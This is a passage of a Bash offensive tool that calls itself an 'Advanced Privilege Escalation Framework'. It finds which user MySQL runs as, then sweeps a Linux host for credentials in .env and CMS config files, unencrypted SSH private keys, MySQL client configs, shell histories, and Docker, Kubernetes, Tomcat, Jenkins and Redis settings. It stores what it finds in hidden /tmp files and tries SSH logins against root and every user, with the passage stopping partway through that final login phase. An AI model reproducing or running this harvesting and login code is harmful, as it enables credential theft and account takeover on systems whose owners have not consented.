#!/bin/bash
#
# Xenon1337

set -o pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Configuration
REPORT_FILE="/tmp/privesc_advanced_v2_$(date +%Y%m%d_%H%M%S).txt"
CREDS_FILE="/tmp/.found_creds_$$"
USERS_FILE="/tmp/.found_users_$$"
MYSQL_PROCESS_USER=""
MYSQL_CMD=""
VERBOSE=0
SUCCESS=0
ESCALATION_METHOD=""
TARGET_USER=""

# Arrays for found credentials
declare -A FOUND_PASSWORDS
declare -A FOUND_USERS

# Banner
show_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║      ADVANCED PRIVILEGE ESCALATION FRAMEWORK v2.2             ║
║                                                               ║
║   MySQL Process Detection | Auto-Exploit by User Context      ║
║   UDF Exploitation | Log Abuse | LOAD DATA | DUMPFILE         ║
║   Deep Exploitation | Auto-Login | User Pivoting              ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Logging functions
log_info() {
    echo -e "${BLUE}[*]${NC} $1"
    echo "[*] $1" >> "$REPORT_FILE"
}

log_success() {
    echo -e "${GREEN}[+]${NC} $1"
    echo "[+] $1" >> "$REPORT_FILE"
}

log_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
    echo "[!] $1" >> "$REPORT_FILE"
}

log_error() {
    echo -e "${RED}[-]${NC} $1"
    echo "[-] $1" >> "$REPORT_FILE"
}

log_exploit() {
    echo -e "${MAGENTA}[EXPLOIT]${NC} ${GREEN}$1${NC}"
    echo "[EXPLOIT] $1" >> "$REPORT_FILE"
}

log_critical() {
    echo -e "${RED}[CRITICAL]${NC} ${YELLOW}$1${NC}"
    echo "[CRITICAL] $1" >> "$REPORT_FILE"
}

# Helper: ps aux replacement (fallback to /proc if ps not found)
_ps_aux() {
    if command -v ps &>/dev/null; then
        ps aux 2>/dev/null
    else
        # Fallback: read /proc for process info
        for pid_dir in /proc/[0-9]*; do
            local pid=$(basename "$pid_dir")
            local user=$(stat -c "%U" "$pid_dir" 2>/dev/null || echo "?")
            local cmdline=$(tr '\0' ' ' < "$pid_dir/cmdline" 2>/dev/null)
            [ -z "$cmdline" ] && continue
            echo "$user $pid $cmdline"
        done
    fi
}

# Initialize report
init_report() {
    cat > "$REPORT_FILE" << EOF
╔═══════════════════════════════════════════════════════════════╗
║   ADVANCED PRIVILEGE ESCALATION REPORT v2.2                   ║
║   MySQL Process User Detection & Context-Based Exploitation   ║
╚═══════════════════════════════════════════════════════════════╝

Test Date: $(date)
Hostname: $(hostname)
Kernel: $(uname -r)
OS: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"')

Initial User: $(whoami) (UID: $(id -u))
Initial Groups: $(groups)

════════════════════════════════════════════════════════════════

EOF
}

# Check MySQL process user
detect_mysql_process_user() {
    log_info "Detecting MySQL process owner..."
    echo "" >> "$REPORT_FILE"
    echo "═══ MYSQL PROCESS DETECTION ═══" >> "$REPORT_FILE"
    
    # Check if MySQL is running
    local mysql_proc=$(_ps_aux | grep -E "mysqld|mariadbd" | grep -v grep)
    
    if [ -z "$mysql_proc" ]; then
        log_warning "MySQL process not found"
        return 1
    fi
    
    # Extract MySQL process user
    MYSQL_PROCESS_USER=$(echo "$mysql_proc" | head -1 | awk '{print $1}')
    
    log_success "MySQL is running!"
    log_info "Process details:"
    echo "$mysql_proc" | head -3 | while read line; do
        echo "  $line" | tee -a "$REPORT_FILE"
    done
    
    echo "" | tee -a "$REPORT_FILE"
    log_success "MySQL Process User: $MYSQL_PROCESS_USER"
    
    # Determine exploitation strategy based on user
    if [ "$MYSQL_PROCESS_USER" == "root" ]; then
        log_critical "MySQL is running as ROOT!"
        log_exploit "Any file written via MySQL will be owned by root!"
        log_exploit "Direct path to root access via INTO OUTFILE"
        echo "[CRITICAL] MySQL running as root - HIGH IMPACT" >> "$REPORT_FILE"
        return 0
    elif [ "$MYSQL_PROCESS_USER" == "mysql" ]; then
        log_warning "MySQL is running as mysql user"
        log_info "Can potentially pivot to mysql user access"
        echo "[INFO] MySQL running as mysql user" >> "$REPORT_FILE"
        return 0
    else
        log_success "MySQL is running as: $MYSQL_PROCESS_USER"
        log_info "Can potentially pivot to $MYSQL_PROCESS_USER access"
        echo "[INFO] MySQL running as $MYSQL_PROCESS_USER" >> "$REPORT_FILE"
        return 0
    fi
}

# ═══════════════════════════════════════════════════════════════
# INFORMATION DISCLOSURE -> CREDENTIAL HARVEST -> AUTO LOGIN
# Comprehensive file scan, credential extraction, and
# automatic login attempt with interactive shell on success
# ═══════════════════════════════════════════════════════════════

try_deep_info_disclosure() {
    log_info "═══════════════════════════════════════════════"
    log_info "  INFORMATION DISCLOSURE & AUTO-LOGIN ENGINE"
    log_info "═══════════════════════════════════════════════"
    echo "" >> "$REPORT_FILE"
    echo "═══ INFORMATION DISCLOSURE & CREDENTIAL HARVEST ═══" >> "$REPORT_FILE"

    local found_creds=0
    local search_dirs=("/var/www" "/opt" "/home" "/usr/local" "/srv" "/etc"
                       "/root" "/tmp" "/var/tmp" "/usr/share/nginx" "/var/lib"
                       "/run" "/snap" "/data" "/mnt" "/backup" "/backups")

    # ──────────────────────────────────────────
    # PHASE 1: .env Files (Laravel, Node, Django, etc)
    # ──────────────────────────────────────────
    log_info "[Phase 1/8] Scanning .env files..."

    for location in "${search_dirs[@]}"; do
        [ ! -d "$location" ] && continue

        find "$location" -maxdepth 5 \( -name ".env" -o -name ".env.local" -o -name ".env.production" \
            -o -name ".env.staging" -o -name ".env.backup" -o -name ".env.old" \
            -o -name ".env.dev" -o -name ".env.example" -o -name ".env.bak" \) \
            -readable 2>/dev/null | head -30 | while read envfile; do

            [ ! -r "$envfile" ] && continue
            log_success "Found .env: $envfile"
            echo "FILE: $envfile" >> "$REPORT_FILE"

            # Extract ALL credential patterns
            local db_user=$(grep -iE "^DB_USER(NAME)?=" "$envfile" 2>/dev/null | head -1 | cut -d= -f2- | tr -d "'" | tr -d '"' | tr -d ' ')
            local db_pass=$(grep -iE "^DB_PASS(WORD)?=" "$envfile" 2>/dev/null | head -1 | cut -d= -f2- | tr -d "'" | tr -d '"' | tr -d ' ')
            local db_host=$(grep -iE "^DB_HOST=" "$envfile" 2>/dev/null | head -1 | cut -d= -f2- | tr -d "'" | tr -d '"' | tr -d ' ')

            local ssh_user=$(grep -iE "^SSH_USER(NAME)?=" "$envfile" 2>/dev/null | head -1 | cut -d= -f2- | tr -d "'" | tr -d '"' | tr -d ' ')
            local ssh_pass=$(grep -iE "^SSH_PASS(WORD)?=" "$envfile" 2>/dev/null | head -1 | cut -d= -f2- | tr -d "'" | tr -d '"' | tr -d ' ')
            local ssh_host=$(grep -iE "^SSH_HOST=" "$envfile" 2>/dev/null | head -1 | cut -d= -f2- | tr -d "'" | tr -d '"' | tr -d ' ')
            local ssh_key_path=$(grep -iE "^SSH_KEY|^SSH_PRIVATE" "$envfile" 2>/dev/null | head -1 | cut -d= -f2- | tr -d "'" | tr -d '"' | tr -d ' ')

            local app_key=$(grep -iE "^APP_KEY=|^SECRET_KEY=|^API_KEY=|^JWT_SECRET=" "$envfile" 2>/dev/null | head -1 | cut -d= -f2- | tr -d "'" | tr -d '"')
            local mail_pass=$(grep -iE "^MAIL_PASS(WORD)?=" "$envfile" 2>/dev/null | head -1 | cut -d= -f2- | tr -d "'" | tr -d '"' | tr -d ' ')
            local redis_pass=$(grep -iE "^REDIS_PASS(WORD)?=" "$envfile" 2>/dev/null | head -1 | cut -d= -f2- | tr -d "'" | tr -d '"' | tr -d ' ')
            local aws_key=$(grep -iE "^AWS_SECRET|^AWS_ACCESS" "$envfile" 2>/dev/null | head -1 | cut -d= -f2- | tr -d "'" | tr -d '"' | tr -d ' ')

            # Generic password/secret lines
            local all_secrets=$(grep -iE "PASS(WORD)?=|SECRET=|TOKEN=|KEY=|AUTH=" "$envfile" 2>/dev/null | grep -v "^#" | head -20)

            if [ -n "$db_user" ] && [ -n "$db_pass" ]; then
                log_success "  DB Creds: $db_user:$db_pass (host: ${db_host:-localhost})"
                echo "$db_user:$db_pass:env_database" >> "$CREDS_FILE"
                FOUND_PASSWORDS["$db_user"]="$db_pass"
                found_creds=1
            fi

            if [ -n "$ssh_user" ] && [ -n "$ssh_pass" ]; then
                log_critical "  SSH Creds: $ssh_user:$ssh_pass (host: ${ssh_host:-localhost})"
                echo "$ssh_user:$ssh_pass:env_ssh" >> "$CREDS_FILE"
                FOUND_PASSWORDS["$ssh_user"]="$ssh_pass"
                found_creds=1

                # --- IMMEDIATE SSH LOGIN ATTEMPT ---
                _try_ssh_login "$ssh_user" "$ssh_pass" "${ssh_host:-localhost}" "env_ssh"
                [ $SUCCESS -eq 1 ] && return 0
            fi

            if [ -n "$ssh_key_path" ] && [ -r "$ssh_key_path" ]; then
                log_critical "  SSH Key Path from .env: $ssh_key_path"
                _try_ssh_key_login "$ssh_key_path" "$ssh_user" "${ssh_host:-localhost}" "env_ssh_key"
                [ $SUCCESS -eq 1 ] && return 0
            fi

            if [ -n "$mail_pass" ]; then
                log_success "  Mail Password: $mail_pass"
                echo "mailuser:$mail_pass:env_mail" >> "$CREDS_FILE"
                FOUND_PASSWORDS["_mail"]="$mail_pass"
                found_creds=1
            fi

            if [ -n "$redis_pass" ]; then
                log_success "  Redis Password: $redis_pass"
                echo "redis:$redis_pass:env_redis" >> "$CREDS_FILE"
                FOUND_PASSWORDS["_redis"]="$redis_pass"
                found_creds=1
            fi

            if [ -n "$app_key" ]; then
                log_success "  App Key/Secret: $app_key"
                echo "ENV_SECRET: $app_key" >> "$REPORT_FILE"
            fi

            if [ -n "$aws_key" ]; then
                log_critical "  AWS Credential: $aws_key"
                echo "AWS_CRED: $aws_key" >> "$REPORT_FILE"
            fi

            if [ -n "$all_secrets" ]; then
                echo "--- SECRETS from $envfile ---" >> "$REPORT_FILE"
                echo "$all_secrets" >> "$REPORT_FILE"
            fi
        done
    done

    # ──────────────────────────────────────────
    # PHASE 2: PHP Config Files
    # ──────────────────────────────────────────
    log_info "[Phase 2/8] Scanning PHP config files..."

    local php_configs=(
        "wp-config.php" "config.php" "settings.php" "database.php"
        "configuration.php" "config.inc.php" "db.php" "conn.php"
        "connect.php" "connection.php" "dbconfig.php" "db_config.php"
        "local.php" "parameters.php" "app.php"
    )

    for location in "${search_dirs[@]}"; do
        [ ! -d "$location" ] && continue

        for cfg_name in "${php_configs[@]}"; do
            find "$location" -maxdepth 5 -name "$cfg_name" -readable 2>/dev/null | head -10 | while read config; do
                [ ! -r "$config" ] && continue
                log_success "Found config: $config"
                echo "FILE: $config" >> "$REPORT_FILE"

                local file_content=$(cat "$config" 2>/dev/null)

                # WordPress wp-config.php
                if echo "$config" | grep -q "wp-config"; then
                    local wp_db_user=$(echo "$file_content" | grep "DB_USER" | grep -oP "'[^']+'" | tail -1 | tr -d "'")
                    local wp_db_pass=$(echo "$file_content" | grep "DB_PASSWORD" | grep -oP "'[^']+'" | tail -1 | tr -d "'")
                    local wp_db_host=$(echo "$file_content" | grep "DB_HOST" | grep -oP "'[^']+'" | tail -1 | tr -d "'")
                    local wp_table_prefix=$(echo "$file_content" | grep "table_prefix" | grep -oP "'[^']+'" | head -1 | tr -d "'")

                    if [ -n "$wp_db_user" ] && [ -n "$wp_db_pass" ]; then
                        log_critical "  WP DB: $wp_db_user:$wp_db_pass@${wp_db_host:-localhost}"
                        echo "$wp_db_user:$wp_db_pass:wp-config" >> "$CREDS_FILE"
                        FOUND_PASSWORDS["$wp_db_user"]="$wp_db_pass"
                        found_creds=1
                    fi

                    # Extract auth keys/salts
                    local auth_keys=$(echo "$file_content" | grep -E "AUTH_KEY|SECURE_AUTH|LOGGED_IN|NONCE" | head -8)
                    if [ -n "$auth_keys" ]; then
                        log_success "  WP Auth Keys found"
                        echo "WP_KEYS: $auth_keys" >> "$REPORT_FILE"
                    fi
                fi

                # Joomla configuration.php
                if echo "$config" | grep -q "configuration.php"; then
                    local jm_user=$(echo "$file_content" | grep -E "\\\$user\s*=" | head -1 | grep -oP "'[^']+'" | tr -d "'")
                    local jm_pass=$(echo "$file_content" | grep -E "\\\$password\s*=" | head -1 | grep -oP "'[^']+'" | tr -d "'")

                    if [ -n "$jm_user" ] && [ -n "$jm_pass" ]; then
                        log_critical "  Joomla DB: $jm_user:$jm_pass"
                        echo "$jm_user:$jm_pass:joomla-config" >> "$CREDS_FILE"
                        FOUND_PASSWORDS["$jm_user"]="$jm_pass"
                        found_creds=1
                    fi
                fi

                # Drupal settings.php
                if echo "$config" | grep -q "settings.php"; then
                    local dr_user=$(echo "$file_content" | grep -E "'username'" | head -1 | grep -oP "'[^']+'" | tail -1 | tr -d "'")
                    local dr_pass=$(echo "$file_content" | grep -E "'password'" | head -1 | grep -oP "'[^']+'" | tail -1 | tr -d "'")

                    if [ -n "$dr_user" ] && [ -n "$dr_pass" ]; then
                        log_critical "  Drupal DB: $dr_user:$dr_pass"
                        echo "$dr_user:$dr_pass:drupal-config" >> "$CREDS_FILE"
                        FOUND_PASSWORDS["$dr_user"]="$dr_pass"
                        found_creds=1
                    fi
                fi

                # Laravel database.php
                if echo "$config" | grep -q "database.php"; then
                    local lv_user=$(echo "$file_content" | grep -E "'username'" | head -1 | grep -oP "'[^']+'" | tail -1 | tr -d "'")
                    local lv_pass=$(echo "$file_content" | grep -E "'password'" | head -1 | grep -oP "'[^']+'" | tail -1 | tr -d "'")

                    if [ -n "$lv_user" ] && [ -n "$lv_pass" ]; then
                        log_critical "  Laravel DB: $lv_user:$lv_pass"
                        echo "$lv_user:$lv_pass:laravel-config" >> "$CREDS_FILE"
                        FOUND_PASSWORDS["$lv_user"]="$lv_pass"
                        found_creds=1
                    fi
                fi

                # Generic PHP configs
                local generic_pass=$(echo "$file_content" | grep -iE "\\\$password\s*=|\\\$passwd\s*=|\\\$db_pass\s*=|\\\$dbpass\s*=" | head -5)
                if [ -n "$generic_pass" ]; then
                    log_success "  Password assignments found in $config:"
                    echo "$generic_pass" | while read gpline; do
                        local extracted=$(echo "$gpline" | grep -oP "'[^']+'" | tail -1 | tr -d "'")
                        if [ -n "$extracted" ] && [ ${#extracted} -ge 2 ]; then
                            log_info "    -> $extracted"
                            echo "generic_php_user:$extracted:php-config" >> "$CREDS_FILE"
                            FOUND_PASSWORDS["_php_$(basename $config)"]="$extracted"
                            found_creds=1
                        fi
                    done
                fi
            done
        done
    done

    # ──────────────────────────────────────────
    # PHASE 3: YAML/JSON/XML Config Files
    # ──────────────────────────────────────────
    log_info "[Phase 3/8] Scanning YAML/JSON/XML configs..."

    for location in "${search_dirs[@]}"; do
        [ ! -d "$location" ] && continue

        find "$location" -maxdepth 5 \( -name "*.yml" -o -name "*.yaml" -o -name "*.json" -o -name "*.xml" -o -name "*.conf" -o -name "*.cfg" -o -name "*.ini" \) \
            -readable -size -2M 2>/dev/null | head -50 | while read cfgfile; do

            [ ! -r "$cfgfile" ] && continue

            local pass_lines=$(grep -iE "password|passwd|secret|token|api_key|apikey|credentials|auth_pass" "$cfgfile" 2>/dev/null | grep -v "^#" | grep -v "^//" | head -5)

            if [ -n "$pass_lines" ]; then
                log_success "Credentials in: $cfgfile"
                echo "FILE: $cfgfile" >> "$REPORT_FILE"

                echo "$pass_lines" | while read pline; do
                    log_info "  $pline"
                    echo "  $pline" >> "$REPORT_FILE"

                    # Try to extract password value
                    local pval=""
                    # YAML: password: value / password: "value"
                    pval=$(echo "$pline" | grep -oP '(?<=:\s)["\x27]?[^\s"'\''#]+' | head -1 | tr -d "'" | tr -d '"')

                    # JSON: "password": "value"
                    if [ -z "$pval" ]; then
                        pval=$(echo "$pline" | grep -oP '(?<=:\s*")[^"]+' | head -1)
                    fi

                    # INI/conf: password = value
                    if [ -z "$pval" ]; then
                        pval=$(echo "$pline" | grep -oP '(?<==\s*)[^\s]+' | head -1 | tr -d "'" | tr -d '"')
                    fi

                    if [ -n "$pval" ] && [ ${#pval} -ge 2 ] && [ "$pval" != "null" ] && [ "$pval" != "None" ] && [ "$pval" != "false" ] && [ "$pval" != "true" ]; then
                        echo "config_user:$pval:config-$(basename $cfgfile)" >> "$CREDS_FILE"
                        FOUND_PASSWORDS["_cfg_$(basename $cfgfile)"]="$pval"
                        found_creds=1
                    fi
                done
            fi
        done
    done

    # ──────────────────────────────────────────
    # PHASE 4: SSH Private Keys
    # ──────────────────────────────────────────
    log_info "[Phase 4/8] Scanning for SSH private keys..."

    local key_files=()

    # Search in all home directories and common locations
    local key_search_dirs=("/home" "/root" "/etc/ssh" "/opt" "/var/lib" "/tmp" "/var/backups" "/var/www")

    for kdir in "${key_search_dirs[@]}"; do
        [ ! -d "$kdir" ] && continue

        local found_keys=$(find "$kdir" -maxdepth 5 \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" \
            -o -name "id_dsa" -o -name "*.pem" -o -name "*.key" -o -name "*.ppk" \
            -o -name "authorized_keys" -o -name "known_hosts" \) -readable 2>/dev/null | head -30)

        if [ -n "$found_keys" ]; then
            echo "$found_keys" | while read kf; do
                if [ -r "$kf" ] && grep -q "PRIVATE KEY" "$kf" 2>/dev/null; then
                    log_critical "SSH PRIVATE KEY: $kf"
                    echo "SSH_KEY: $kf" >> "$REPORT_FILE"

                    local key_owner=$(stat -c "%U" "$kf" 2>/dev/null || echo "unknown")
                    local key_perms=$(stat -c "%a" "$kf" 2>/dev/null || echo "unknown")
                    log_info "  Owner: $key_owner, Perms: $key_perms"

                    # Check if key is encrypted
                    if grep -q "ENCRYPTED" "$kf" 2>/dev/null; then
                        log_warning "  Key is encrypted (passphrase required)"
                    else
                        log_exploit "  Key is NOT encrypted!"

                        # Determine which user this key belongs to
                        local key_user=$(echo "$kf" | grep -oP '(?<=/home/)[^/]+' 2>/dev/null)
                        if echo "$kf" | grep -q "/root/"; then
                            key_user="root"
                        fi

                        # Copy key and try login for all potential users
                        cp "$kf" "/tmp/.disc_key_$$" 2>/dev/null
                        chmod 600 "/tmp/.disc_key_$$" 2>/dev/null

                        # Try the key owner first, then root, then all real users
                        local try_users=()
                        [ -n "$key_user" ] && try_users+=("$key_user")
                        try_users+=("root")

                        # Add users from authorized_keys if found near this key
                        local auth_keys_dir=$(dirname "$kf")
                        if [ -f "${auth_keys_dir}/authorized_keys" ]; then
                            log_info "  Found authorized_keys in same directory"
                        fi

                        # Add all real users
                        while IFS=: read -r uname x uid gid gecos uhome ushell; do
                            if [ "$uid" -ge 1000 ] 2>/dev/null && ! echo "$ushell" | grep -qE "nologin|false"; then
                                try_users+=("$uname")
                            fi
                        done < /etc/passwd

                        for try_user in "${try_users[@]}"; do
                            _try_ssh_key_login "/tmp/.disc_key_$$" "$try_user" "localhost" "discovered_key_$kf"
                            if [ $SUCCESS -eq 1 ]; then
                                return 0
                            fi
                        done

                        rm -f "/tmp/.disc_key_$$" 2>/dev/null
                    fi
                fi

                # authorized_keys - enumerate what users have authorized SSH access
                if echo "$kf" | grep -q "authorized_keys" && [ -r "$kf" ]; then
                    local num_keys=$(wc -l < "$kf" 2>/dev/null)
                    local auth_user=$(echo "$kf" | grep -oP '(?<=/home/)[^/]+|(?<=^/root)' 2>/dev/null)
                    log_info "  authorized_keys for $auth_user: $num_keys keys"
                    echo "AUTH_KEYS[$auth_user]: $num_keys keys" >> "$REPORT_FILE"
                fi
            done
        fi
    done

    # ──────────────────────────────────────────
    # PHASE 5: .my.cnf / MySQL Client Configs
    # ──────────────────────────────────────────
    log_info "[Phase 5/8] Scanning MySQL client configs (.my.cnf)..."

    find /home /root /var/lib /etc -maxdepth 3 \( -name ".my.cnf" -o -name ".mylogin.cnf" -o -name "my.cnf" \
        -o -name "debian.cnf" \) -readable 2>/dev/null | head -20 | while read mycnf; do

        [ ! -r "$mycnf" ] && continue
        log_success "MySQL config: $mycnf"
        echo "MYSQL_CONFIG: $mycnf" >> "$REPORT_FILE"

        local my_user=$(grep -iE "^user\s*=" "$mycnf" 2>/dev/null | head -1 | cut -d= -f2 | tr -d ' ' | tr -d '"' | tr -d "'")
        local my_pass=$(grep -iE "^password\s*=" "$mycnf" 2>/dev/null | head -1 | cut -d= -f2 | tr -d ' ' | tr -d '"' | tr -d "'")

        if [ -n "$my_user" ] && [ -n "$my_pass" ]; then
            log_critical "  MySQL auto-login: $my_user:$my_pass"
            echo "$my_user:$my_pass:my.cnf" >> "$CREDS_FILE"
            FOUND_PASSWORDS["$my_user"]="$my_pass"
            found_creds=1
        elif [ -n "$my_pass" ]; then
            log_critical "  MySQL password: $my_pass (user unspecified)"
            echo "mysql_unknown:$my_pass:my.cnf" >> "$CREDS_FILE"
            FOUND_PASSWORDS["_mycnf"]="$my_pass"
            found_creds=1
        fi

        # Log full content for review
        grep -vE "^#|^$|^\[" "$mycnf" 2>/dev/null >> "$REPORT_FILE"
    done

    # ──────────────────────────────────────────
    # PHASE 6: Shell History Files
    # ──────────────────────────────────────────
    log_info "[Phase 6/8] Scanning shell/app history files..."

    while IFS=: read -r uname x uid gid gecos home shell; do
        [ -z "$home" ] || [ "$home" == "/" ] && continue

        local hist_files=(
            "${home}/.bash_history" "${home}/.zsh_history" "${home}/.sh_history"
            "${home}/.mysql_history" "${home}/.psql_history" "${home}/.python_history"
            "${home}/.node_repl_history" "${home}/.rediscli_history" "${home}/.dbshell"
        )

        for hf in "${hist_files[@]}"; do
            [ ! -r "$hf" ] && continue
            local hcontent=$(cat "$hf" 2>/dev/null)
            [ -z "$hcontent" ] && continue

            # Extract mysql -p<password> patterns
            local mysql_cmds=$(echo "$hcontent" | grep -oP 'mysql\s+.*-p\K[^\s]+' 2>/dev/null | sort -u)
            if [ -n "$mysql_cmds" ]; then
                log_critical "MySQL passwords in $hf:"
                echo "$mysql_cmds" | while read mpass; do
                    # Skip if it's just -p (interactive)
                    [ ${#mpass} -lt 2 ] && continue
                    log_exploit "  mysql -p$mpass"
                    echo "history_mysql:$mpass:bash_history" >> "$CREDS_FILE"
                    FOUND_PASSWORDS["_hist_mysql_$uname"]="$mpass"
                    found_creds=1
                done
            fi

            # Extract sshpass -p<password> patterns
            local sshpass_cmds=$(echo "$hcontent" | grep -oP "sshpass\s+-p\s*['\"]?\K[^'\"\s]+" 2>/dev/null | sort -u)
            if [ -n "$sshpass_cmds" ]; then
                log_critical "SSH passwords in $hf:"
                echo "$sshpass_cmds" | while read spass; do
                    log_exploit "  sshpass -p $spass"
                    echo "history_ssh:$spass:bash_history" >> "$CREDS_FILE"
                    FOUND_PASSWORDS["_hist_ssh_$uname"]="$spass"
                    found_creds=1
                done
            fi

            # Extract curl -u user:pass patterns
            local curl_creds=$(echo "$hcontent" | grep -oP 'curl\s+.*-u\s+\K[^\s]+' 2>/dev/null | sort -u)
            if [ -n "$curl_creds" ]; then
                log_success "HTTP credentials in $hf:"
                echo "$curl_creds" | while read cc; do
                    log_info "  curl -u $cc"
                    local cuser=$(echo "$cc" | cut -d: -f1)
                    local cpass=$(echo "$cc" | cut -d: -f2-)
                    if [ -n "$cpass" ]; then
                        echo "$cuser:$cpass:curl_history" >> "$CREDS_FILE"
                        FOUND_PASSWORDS["_curl_$cuser"]="$cpass"
                        found_creds=1
                    fi
                done
            fi

            # Extract FTP/URL credentials (ftp://user:pass@host)
            local url_creds=$(echo "$hcontent" | grep -oP '(ftp|http|https|mysql|postgresql)://[^:]+:\K[^@]+(?=@)' 2>/dev/null | sort -u)
            if [ -n "$url_creds" ]; then
                log_success "URL credentials in $hf:"
                echo "$url_creds" | while read uc; do
                    log_info "  password: $uc"
                    echo "url_user:$uc:url_history" >> "$CREDS_FILE"
                    FOUND_PASSWORDS["_url_$uname"]="$uc"
                    found_creds=1
                done
            fi

            # Extract echo "pass" | sudo -S patterns
            local sudo_pass=$(echo "$hcontent" | grep -oP "echo\s+['\"]?\K[^'\"]+(?=['\"]?\s*\|\s*sudo)" 2>/dev/null | sort -u)
            if [ -n "$sudo_pass" ]; then
                log_critical "Sudo passwords in $hf:"
                echo "$sudo_pass" | while read sp; do
                    log_exploit "  sudo password: $sp"
                    echo "$uname:$sp:sudo_history" >> "$CREDS_FILE"
                    FOUND_PASSWORDS["$uname"]="$sp"
                    found_creds=1
                done
            fi
        done
    done < /etc/passwd

    # ──────────────────────────────────────────
    # PHASE 7: Python/Ruby/Node/Docker/K8s Configs
    # ──────────────────────────────────────────
    log_info "[Phase 7/8] Scanning application & container configs..."

    local app_configs=(
        "/etc/docker/daemon.json"
        "/root/.docker/config.json"
        "/etc/kubernetes/admin.conf"
        "/root/.kube/config"
        "/etc/ansible/hosts"
        "/etc/grafana/grafana.ini"
        "/etc/tomcat*/tomcat-users.xml"
        "/etc/redis/redis.conf"
        "/etc/postgresql/*/main/pg_hba.conf"
        "/etc/mongod.conf"
        "/etc/cassandra/cassandra.yaml"
        "/var/jenkins_home/secrets/initialAdminPassword"
        "/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml"
    )

    for acfg in "${app_configs[@]}"; do
        # Handle wildcards
        local expanded=$(ls $acfg 2>/dev/null)
        [ -z "$expanded" ] && continue

        echo "$expanded" | while read acfg_file; do
            [ ! -r "$acfg_file" ] && continue

            local acontent=$(cat "$acfg_file" 2>/dev/null)
            if echo "$acontent" | grep -qiE "password|passwd|secret|token|auth" 2>/dev/null; then
                log_success "App config: $acfg_file"
                echo "APP_CONFIG: $acfg_file" >> "$REPORT_FILE"

                local secret_lines=$(echo "$acontent" | grep -iE "password|passwd|secret|token|auth" | grep -v "^#" | head -10)
                echo "$secret_lines" | while read sline; do
                    log_info "  $sline"
                    echo "  $sline" >> "$REPORT_FILE"
                done

                # Redis.conf specific
                if echo "$acfg_file" | grep -q "redis"; then
                    local redis_pw=$(echo "$acontent" | grep "^requirepass" | awk '{print $2}')
                    if [ -n "$redis_pw" ]; then
                        log_critical "  Redis password: $redis_pw"
                        echo "redis:$redis_pw:redis.conf" >> "$CREDS_FILE"
                        FOUND_PASSWORDS["_redis_conf"]="$redis_pw"
                        found_creds=1
                    fi
                fi

                # Tomcat tomcat-users.xml
                if echo "$acfg_file" | grep -q "tomcat-users"; then
                    local tomcat_pass=$(echo "$acontent" | grep -oP 'password="[^"]+' | head -1 | cut -d'"' -f2)
                    local tomcat_user=$(echo "$acontent" | grep -oP 'username="[^"]+' | head -1 | cut -d'"' -f2)
                    if [ -n "$tomcat_user" ] && [ -n "$tomcat_pass" ]; then
                        log_critical "  Tomcat: $tomcat_user:$tomcat_pass"
                        echo "$tomcat_user:$tomcat_pass:tomcat" >> "$CREDS_FILE"
                        FOUND_PASSWORDS["$tomcat_user"]="$tomcat_pass"
                        found_creds=1
                    fi
                fi

                # Jenkins initial password
                if echo "$acfg_file" | grep -q "jenkins"; then
                    log_critical "  Jenkins admin password: $(cat $acfg_file 2>/dev/null)"
                    echo "JENKINS_PASS: $(cat $acfg_file 2>/dev/null)" >> "$REPORT_FILE"
                fi

                # Docker config.json (may contain registry auth)
                if echo "$acfg_file" | grep -q "docker/config.json"; then
                    local docker_auth=$(echo "$acontent" | grep -oP '"auth"\s*:\s*"[^"]+' | cut -d'"' -f4)
                    if [ -n "$docker_auth" ]; then
                        local decoded=$(echo "$docker_auth" | base64 -d 2>/dev/null)
                        if [ -n "$decoded" ]; then
                            log_critical "  Docker registry creds: $decoded"
                            local dk_user=$(echo "$decoded" | cut -d: -f1)
                            local dk_pass=$(echo "$decoded" | cut -d: -f2-)
                            echo "$dk_user:$dk_pass:docker_registry" >> "$CREDS_FILE"
                            FOUND_PASSWORDS["$dk_user"]="$dk_pass"
                            found_creds=1
                        fi
                    fi
                fi

                # Kubernetes admin.conf / kubeconfig
                if echo "$acfg_file" | grep -qE "kube|kubernetes"; then
                    log_critical "  Kubernetes config found - may contain cluster creds"
                    echo "K8S_CONFIG: $acfg_file" >> "$REPORT_FILE"
                fi
            fi
        done
    done

    # ──────────────────────────────────────────
    # PHASE 8: Auto-Login with ALL Collected Credentials
    # ──────────────────────────────────────────
    log_info "[Phase 8/8] Attempting login with ALL collected credentials..."

    if [ $found_creds -eq 0 ] && [ ! -s "$CREDS_FILE" ]; then
        log_warning "No credentials found during information disclosure"
        return 1
    fi

    log_success "Credentials collected - starting auto-login..."

    # Build unique password list
    local disc_passwords=()
    declare -A disc_seen

    if [ -s "$CREDS_FILE" ]; then
        while IFS=: read -r cuser cpass csource; do
            if [ -n "$cpass" ] && [ -z "${disc_seen[$cpass]}" ]; then
                disc_seen["$cpass"]=1
                disc_passwords+=("$cpass")
            fi
        done < "$CREDS_FILE"
    fi

    for pkey in "${!FOUND_PASSWORDS[@]}"; do
        local pval="${FOUND_PASSWORDS[$pkey]}"
        if [ -n "$pval" ] && [ -z "${disc_seen[$pval]}" ]; then
            disc_seen["$pval"]=1
            disc_passwords+=("$pval")
        fi
    done

    local total_disc=${#disc_passwords[@]}
    log_info "Unique passwords to try: $total_disc"

    if [ $total_disc -eq 0 ]; then
        log_warning "No usable passwords extracted"
        return 1
    fi

    # Build target user list (root first, then real users)
    local disc_targets=("root")

    while IFS=: read -r uname x uid gid gecos uhome ushell; do
        [ "$uname" == "root" ] && continue
        echo "$ushell" | grep -qE "nologin|false|sync|halt|shutdown" && continue
        if [ "$uid" -ge 1000 ] 2>/dev/null; then
            disc_targets+=("$uname")
        fi
    done < /etc/passwd

    [ -n "$MYSQL_PROCESS_USER" ] && [ "$MYSQL_PROCESS_USER" != "root" ] && disc_targets+=("$MYSQL_PROCESS_USER")

    local total_targets=${#disc_targets[@]}
    log_info "Target users: ${disc_targets[*]}"
